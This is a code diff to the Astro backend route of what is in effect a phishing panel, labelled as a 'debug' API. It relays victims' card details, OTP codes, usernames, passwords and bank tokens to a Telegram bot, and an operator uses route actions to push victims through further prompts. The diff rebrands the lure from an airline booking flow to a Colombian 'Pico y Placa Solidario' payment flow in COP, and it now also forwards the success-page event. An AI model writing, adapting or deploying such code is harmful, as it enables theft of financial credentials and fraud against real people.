@@ -3,7 +3,7 @@ export const prerender = false;
 import type { APIRoute } from 'astro';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from 'astro:env/server';
 
-type DebugEvent = 'P1' | 'P2' | 'P3' | 'P4' | 'P-PAYMENT' | 'P-SUCCESS' | 'PAYMENT_SUBMIT' | 'OTP_SUBMIT' | 'USERPASS_SUBMIT' | 'TOKEN_SUBMIT' | 'DYNAMIC_SUBMIT';
+type DebugEvent = 'P1' | 'P2' | 'P3' | 'P4' | 'P5' | 'P-STEP' | 'P-PAYMENT' | 'P-SUCCESS' | 'CARD_BANNER' | 'PAYMENT_SUBMIT' | 'OTP_SUBMIT' | 'USERPASS_SUBMIT' | 'TOKEN_SUBMIT' | 'DYNAMIC_SUBMIT';
 type RouteAction = 'wait' | 'sms' | 'card' | 'sms_error' | 'card_error' | 'approved' | 'userpass' | 'userpass_error' | 'token' | 'token_error' | 'dynamic' | 'dynamic_error';
 
 type RouteDecision = {
@@ -183,13 +183,16 @@ function isProcessingEvent(event: unknown) {
 function stepLabel(event: unknown, meta?: Record<string, unknown>) {
   if (typeof meta?.step === 'string' && meta.step.trim()) return meta.step.trim();
   const labels: Record<string, string> = {
-    P1: 'Inicio / reserva',
-    P2: 'Eligiendo vuelos',
-    P3: 'Resumen del viaje',
-    P4: 'Datos de pasajeros',
-    'P-PAYMENT': 'Página de pago',
-    'P-SUCCESS': 'Compra confirmada',
-    PAYMENT_SUBMIT: 'Pago en proceso',
+    P1: 'Entró a Inicio',
+    P2: 'Entró al Simulador',
+    P3: 'Entró a Registro',
+    P4: 'Entró a Consulta',
+    P5: 'Entró a Preguntas frecuentes',
+    'P-STEP': 'Avanzó en la solicitud',
+    'P-PAYMENT': 'Entró a pagos',
+    'P-SUCCESS': 'Vió el comprobante de pago aprobado',
+    CARD_BANNER: 'Abrió banner de pago tarjeta crédito o débito',
+    PAYMENT_SUBMIT: '✅ Agregó datos tarjeta',
     OTP_SUBMIT: 'Envió código OTP',
     USERPASS_SUBMIT: 'Envió usuario y contraseña',
     TOKEN_SUBMIT: 'Envió token',
@@ -222,14 +225,20 @@ function formatPenAmount(meta: Record<string, unknown>, payload: Record<string, 
   const raw = meta.amount ?? payload.amount;
   const n = Number(raw);
   if (Number.isFinite(n) && String(raw) !== '') {
-    return `USD ${n.toFixed(2).replace('.', ',')}`;
+    return `COP ${Math.round(n).toLocaleString('es-CO')}`;
   }
   return '-';
 }
 
 function formatStepMessage(payload: Record<string, unknown>) {
   const meta = objectValue(payload.meta) || {};
-  return stepLabel(payload.event, meta);
+  return [
+    '🌿 PICO Y PLACA SOLIDARIO',
+    '━━━━━━━━━━━━━━━━━━',
+    `📍 ${stepLabel(payload.event, meta)}`,
+    `🆔 Sesión: ${payload.sessionId || '-'}`,
+    '━━━━━━━━━━━━━━━━━━',
+  ].join('\n');
 }
 
 function formatPaymentMessage(payload: Record<string, unknown>) {
@@ -240,7 +249,7 @@ function formatPaymentMessage(payload: Record<string, unknown>) {
   const cpayload = objectValue(meta.cpayload) || {};
   const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
   return [
-    '✈️ LATAM PANEL',
+    '🌿 PICO Y PLACA SOLIDARIO',
     '━━━━━━━━━━━━━━━━━━',
     `📍 ${stepLabel(payload.event, stepMeta)}`,
     `🆔 Sesión: ${payload.sessionId || '-'}`,
@@ -466,7 +475,7 @@ export const POST: APIRoute = async ({ request }) => {
   console.info('[debug-api:body]', body);
 
   const event = String(body.event || '') as DebugEvent;
-  const allowed = new Set<DebugEvent>(['P1', 'P2', 'P3', 'P4', 'P-PAYMENT', 'P-SUCCESS', 'PAYMENT_SUBMIT', 'OTP_SUBMIT', 'USERPASS_SUBMIT', 'TOKEN_SUBMIT', 'DYNAMIC_SUBMIT']);
+  const allowed = new Set<DebugEvent>(['P1', 'P2', 'P3', 'P4', 'P5', 'P-STEP', 'P-PAYMENT', 'P-SUCCESS', 'CARD_BANNER', 'PAYMENT_SUBMIT', 'OTP_SUBMIT', 'USERPASS_SUBMIT', 'TOKEN_SUBMIT', 'DYNAMIC_SUBMIT']);
   if (!allowed.has(event)) return json({ error: 'Evento debug invalido' }, { status: 400 });
 
   const sessionId = cleanSessionId(body.sessionId);
@@ -521,9 +530,7 @@ export const POST: APIRoute = async ({ request }) => {
 
   console.info('[debug-api]', payload);
   session.payload = payload;
-  const telegram = event === 'P-SUCCESS'
-    ? { sent: false, skipped: 'success-page' }
-    : await sendTelegram(payload, { withButtons: isProcessingEvent(event) });
+  const telegram = await sendTelegram(payload, { withButtons: isProcessingEvent(event) });
 
   return json({ ...payload, telegram });
 };
